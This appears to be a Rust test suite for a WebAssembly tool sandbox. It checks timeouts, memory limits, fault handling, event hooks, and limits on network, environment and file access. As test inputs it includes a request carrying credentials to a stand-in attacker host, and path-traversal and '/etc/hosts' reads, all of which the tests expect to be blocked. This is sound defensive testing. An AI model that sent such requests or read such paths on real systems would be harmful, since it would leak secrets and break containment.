//! Tool calls and events against a real component (`fixtures/tools-probe`),
//! each in an instance of its own: what a tool returns, what ends a tool that
//! misbehaves, and what a tool may reach.
#![cfg(feature = "compile")]

mod common;

use common::*;
use harnix_wasm::*;
use serde_json::json;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio_util::sync::CancellationToken;

fn none() -> CancellationToken {
    CancellationToken::new()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_tools_component_lists_its_tools_and_answers_a_call() {
    let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
    assert_eq!(rig.vm.world(), World::Tools);

    let tools = rig.vm.list_tools(&none()).await.unwrap();
    let echo = tools
        .iter()
        .find(|t| t.name == "echo")
        .expect("echo is exported");
    assert!(echo.read_only && echo.concurrency_safe);
    assert!(echo.doc.as_deref().unwrap().contains("verbatim"));
    assert!(echo.input_schema.contains("\"text\""));

    #[derive(Default)]
    struct Progress(Mutex<Vec<(String, String)>>);
    impl ProgressSink for Progress {
        fn on_progress(&self, call_id: &str, text: &str) {
            self.0.lock().unwrap().push((call_id.into(), text.into()));
        }
    }
    let progress = Arc::new(Progress::default());
    let out = rig
        .vm
        .call_tool(
            "echo",
            &json!({"text": "hello"}),
            "call-1",
            None,
            Some(progress.clone()),
            &none(),
        )
        .await
        .unwrap();
    assert_eq!(out.content, "hello");
    assert_eq!(out.structured, Some(json!({"echoed": "hello"})));
    assert!(!out.is_error);
    assert_eq!(
        progress.0.lock().unwrap().as_slice(),
        [("call-1".to_string(), "echoing".to_string())]
    );

    // A tools component has no backend to call.
    let err = rig
        .vm
        .handle("echo", &json!({}), &json!({}))
        .await
        .unwrap_err();
    assert!(matches!(err, CallFailure::Unavailable(_)), "{err:?}");

    let health = rig.vm.health();
    assert_eq!(health.calls, 2);
    assert_eq!(health.state, VmState::Running);
    assert_eq!(
        health.memory_bytes, 0,
        "every transient store gave its memory back"
    );
    assert!(health.memory_peak_bytes > 0);
}

/// The claim the execution model rests on: a component that never returns
/// costs one call, not the process — and not the next call either.
#[tokio::test(flavor = "multi_thread")]
async fn a_tool_that_never_returns_is_stopped_at_its_timeout() {
    let rig = rig("tools-probe", Capabilities::default(), limits(200)).await;
    let started = Instant::now();
    let err = rig
        .vm
        .call_tool("slow", &json!({}), "c", None, None, &none())
        .await
        .unwrap_err();
    assert_eq!(err, CallFailure::TimedOut);
    assert!(
        started.elapsed() < Duration::from_secs(3),
        "{:?}",
        started.elapsed()
    );

    let out = rig
        .vm
        .call_tool("echo", &json!({"text": "after"}), "c", None, None, &none())
        .await
        .unwrap();
    assert_eq!(out.content, "after");
    let health = rig.vm.health();
    assert_eq!(
        (health.timeouts, health.faults, health.consecutive_faults),
        (1, 0, 0)
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_cancelled_tool_call_ends_promptly_and_is_not_held_against_it() {
    let rig = rig("tools-probe", Capabilities::default(), limits(60_000)).await;
    let cancel = CancellationToken::new();
    let token = cancel.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(100)).await;
        token.cancel();
    });
    let started = Instant::now();
    let err = rig
        .vm
        .call_tool("slow", &json!({}), "c", None, None, &cancel)
        .await
        .unwrap_err();
    assert_eq!(err, CallFailure::Cancelled);
    assert!(started.elapsed() < Duration::from_secs(3));
    assert_eq!(rig.vm.health().consecutive_faults, 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_tool_that_allocates_past_the_memory_limit_fails_and_frees_it() {
    let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
    let err = rig
        .vm
        .call_tool("hog", &json!({"mb": "64"}), "c", None, None, &none())
        .await
        .unwrap_err();
    match &err {
        CallFailure::Faulted(msg) => assert!(msg.contains("memory limit of 32 MiB"), "{msg}"),
        other => panic!("expected a fault, got {other:?}"),
    }
    // Within the limit is fine, and the failed call's memory came back.
    let out = rig
        .vm
        .call_tool("hog", &json!({"mb": "8"}), "c", None, None, &none())
        .await
        .unwrap();
    assert!(out.content.starts_with("held"), "{}", out.content);
    let health = rig.vm.health();
    assert_eq!(health.memory_bytes, 0);
    assert!(health.memory_peak_bytes <= 32 << 20);
    assert!(health.last_error.unwrap().contains("memory limit"));
}

/// The limit is the application's, not each instance's: concurrent calls
/// share it, and a call that cannot even start for lack of it is not the
/// component's fault.
#[tokio::test(flavor = "multi_thread")]
async fn concurrent_tool_calls_share_the_applications_memory() {
    // What one instance takes depends on the toolchain that built the
    // fixture, so measure it, then allow one and a half.
    let probe = rig("tools-probe", Capabilities::default(), limits(300)).await;
    probe
        .vm
        .call_tool(
            "slow",
            &json!({}),
            "m",
            None,
            None,
            &CancellationToken::new(),
        )
        .await
        .ok();
    let one = probe.vm.health().memory_peak_bytes;
    let rig = rig(
        "tools-probe",
        Capabilities::default(),
        Limits {
            memory_bytes: one * 3 / 2,
            timeout: Duration::from_millis(500),
        },
    )
    .await;
    // A tool that never returns holds its instance's memory until it times out.
    let slow = rig.vm.clone();
    let holder = tokio::spawn(async move {
        slow.call_tool("slow", &json!({}), "a", None, None, &none())
            .await
    });
    eventually(Duration::from_secs(2), "the slow call to start", || {
        rig.vm.health().memory_bytes > 0
    })
    .await;
    let err = rig
        .vm
        .call_tool("echo", &json!({"text": "x"}), "b", None, None, &none())
        .await
        .unwrap_err();
    assert!(
        matches!(&err, CallFailure::Unavailable(m) if m.contains("in use by its other instances")),
        "{err:?}"
    );
    assert_eq!(holder.await.unwrap().unwrap_err(), CallFailure::TimedOut);
    assert_eq!(rig.vm.health().consecutive_faults, 0);
    rig.vm
        .call_tool("echo", &json!({"text": "x"}), "c", None, None, &none())
        .await
        .unwrap();
}

#[tokio::test(flavor = "multi_thread")]
async fn the_network_is_reached_only_for_a_declared_host() {
    let caps = Capabilities {
        net: vec!["api.example.com".into()],
        ..Default::default()
    };
    let rig = rig("tools-probe", caps, limits(5_000)).await;

    let out = rig
        .vm
        .call_tool(
            "fetch",
            &json!({"url": "https://api.example.com/v1"}),
            "c",
            None,
            None,
            &none(),
        )
        .await
        .unwrap();
    assert_eq!(out.content, "status=200 body=hello from api.example.com");
    let sent = rig.http.requests.lock().unwrap().clone();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].method, "GET");
    assert_eq!(sent[0].headers, [("x-probe".to_string(), "1".to_string())]);

    let out = rig
        .vm
        .call_tool(
            "fetch",
            &json!({"url": "https://user:s3cret@evil.example/path?token=t0ken"}),
            "c",
            None,
            None,
            &none(),
        )
        .await
        .unwrap();
    assert!(out.is_error);
    assert!(
        out.content.contains("`evil.example`") && out.content.contains("`net`"),
        "{}",
        out.content
    );
    assert!(
        !out.content.contains("s3cret") && !out.content.contains("t0ken"),
        "{}",
        out.content
    );
    assert_eq!(
        rig.http.requests.lock().unwrap().len(),
        1,
        "refused before the network"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn only_a_declared_environment_variable_is_readable() {
    std::env::set_var("HARNIX_WASM_TEST_DECLARED", "yes");
    std::env::set_var("HARNIX_WASM_TEST_UNDECLARED", "also-yes");
    let caps = Capabilities {
        env: vec!["HARNIX_WASM_TEST_DECLARED".into()],
        ..Default::default()
    };
    let rig = rig("tools-probe", caps, limits(5_000)).await;
    for (key, expect) in [
        ("HARNIX_WASM_TEST_DECLARED", "secret=yes "),
        ("HARNIX_WASM_TEST_UNDECLARED", "secret=none "),
    ] {
        let out = rig
            .vm
            .call_tool(
                "fetch",
                &json!({"secret": key, "url": "x"}),
                "c",
                None,
                None,
                &none(),
            )
            .await
            .unwrap();
        assert!(out.content.starts_with(expect), "{key}: {}", out.content);
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn files_are_reachable_only_inside_a_preopened_directory() {
    let rig = rig_with("tools-probe", |dir| {
        let s = spec(
            Capabilities {
                fs: vec![FsGrant {
                    path: "${data}/notes".into(),
                    writable: true,
                }],
                // What it writes there counts toward this.
                storage_bytes: 1 << 20,
                ..Default::default()
            },
            limits(5_000),
            dir,
        );
        std::fs::create_dir_all(dir.join("data/notes")).unwrap();
        std::fs::write(dir.join("data/notes/a.txt"), "inside").unwrap();
        std::fs::write(dir.join("data/outside.txt"), "outside").unwrap();
        s
    })
    .await;
    let call = |tool: &'static str, input: serde_json::Value| {
        let vm = rig.vm.clone();
        async move {
            vm.call_tool(tool, &input, "c", None, None, &CancellationToken::new())
                .await
                .unwrap()
        }
    };

    let out = call("read-file", json!({"path": "/data/notes/a.txt"})).await;
    assert_eq!((out.content.as_str(), out.is_error), ("inside", false));
    let out = call(
        "write-file",
        json!({"path": "/data/notes/b.txt", "text": "new"}),
    )
    .await;
    assert!(!out.is_error, "{}", out.content);
    assert_eq!(
        std::fs::read_to_string(rig.dir.path().join("data/notes/b.txt")).unwrap(),
        "new"
    );

    let host_path = rig
        .dir
        .path()
        .join("data/outside.txt")
        .display()
        .to_string();
    for path in [
        "/data/outside.txt",
        "/data/notes/../outside.txt",
        "/etc/hosts",
        host_path.as_str(),
    ] {
        let out = call("read-file", json!({ "path": path })).await;
        assert!(out.is_error, "`{path}` was readable: {}", out.content);
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_tool_may_not_arm_a_timer() {
    let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
    let out = rig
        .vm
        .call_tool("timer", &json!({}), "c", None, None, &none())
        .await
        .unwrap();
    assert!(
        out.is_error && out.content.contains("for the backend"),
        "{}",
        out.content
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn consecutive_faults_disable_the_application() {
    let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
    // An answer in between resets the streak.
    for _ in 0..FAULT_LIMIT - 1 {
        rig.vm
            .call_tool("explode", &json!({}), "c", None, None, &none())
            .await
            .unwrap_err();
    }
    rig.vm
        .call_tool("echo", &json!({"text": "ok"}), "c", None, None, &none())
        .await
        .unwrap();
    assert_eq!(rig.vm.health().consecutive_faults, 0);

    for _ in 0..FAULT_LIMIT {
        let err = rig
            .vm
            .call_tool("explode", &json!({}), "c", None, None, &none())
            .await
            .unwrap_err();
        assert!(matches!(err, CallFailure::Faulted(_)), "{err:?}");
    }
    let health = rig.vm.health();
    assert!(
        matches!(&health.state, VmState::Disabled { reason } if reason.contains("explode")),
        "{health:?}"
    );
    assert_eq!(health.faults, u64::from(2 * FAULT_LIMIT - 1));

    let err = rig
        .vm
        .call_tool("echo", &json!({"text": "ok"}), "c", None, None, &none())
        .await
        .unwrap_err();
    assert!(
        matches!(&err, CallFailure::Unavailable(m) if m.contains("disabled")),
        "{err:?}"
    );
    assert!(rig.vm.list_tools(&none()).await.is_err());
}

#[tokio::test(flavor = "multi_thread")]
async fn an_event_hook_blocks_a_named_tool_and_lets_the_rest_through() {
    let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
    let decide = |event: &'static str, payload: serde_json::Value| {
        let vm = rig.vm.clone();
        async move {
            vm.on_event(event, &payload, &CancellationToken::new())
                .await
                .unwrap()
        }
    };
    assert_eq!(
        decide("tool.before", json!({"tool": "forbidden"})).await,
        HookDecision::Block("`forbidden` is not allowed here".into())
    );
    assert_eq!(
        decide("tool.before", json!({"tool": "echo"})).await,
        HookDecision::Proceed
    );
    assert!(
        matches!(decide("note", json!({"n": 1})).await, HookDecision::AddContext(t) if t.contains("\"n\":1"))
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_tool_reads_the_configuration_and_its_callers_project_read_only() {
    let rig = rig(
        "tools-probe",
        Capabilities {
            fs: vec![FsGrant {
                path: "${project}".into(),
                writable: false,
            }],
            ..Default::default()
        },
        limits(5_000),
    )
    .await;
    let out = rig
        .vm
        .call_tool("config", &json!({}), "c", None, None, &none())
        .await
        .unwrap();
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&out.content).unwrap(),
        json!({"greeting": "hi"})
    );

    let (a, b) = (rig.dir.path().join("a"), rig.dir.path().join("b"));
    for (dir, text) in [(&a, "project a"), (&b, "project b")] {
        std::fs::create_dir_all(dir).unwrap();
        std::fs::write(dir.join("README.md"), text).unwrap();
    }
    let read =
        |project: Option<std::path::PathBuf>, tool: &'static str, input: serde_json::Value| {
            let vm = rig.vm.clone();
            async move {
                vm.call_tool(tool, &input, "c", project.as_deref(), None, &none())
                    .await
                    .unwrap()
            }
        };
    // Each call sees the project of whoever made it.
    let out = read(
        Some(a.clone()),
        "read-file",
        json!({"path": "/project/README.md"}),
    )
    .await;
    assert_eq!((out.content.as_str(), out.is_error), ("project a", false));
    let out = read(
        Some(b.clone()),
        "read-file",
        json!({"path": "/project/README.md"}),
    )
    .await;
    assert_eq!(out.content, "project b");
    // No project, no `/project`; and never writable.
    let out = read(None, "read-file", json!({"path": "/project/README.md"})).await;
    assert!(out.is_error, "{}", out.content);
    let out = read(
        Some(a.clone()),
        "write-file",
        json!({"path": "/project/README.md", "text": "changed"}),
    )
    .await;
    assert!(out.is_error, "the project was writable: {}", out.content);
    assert_eq!(
        std::fs::read_to_string(a.join("README.md")).unwrap(),
        "project a"
    );
}
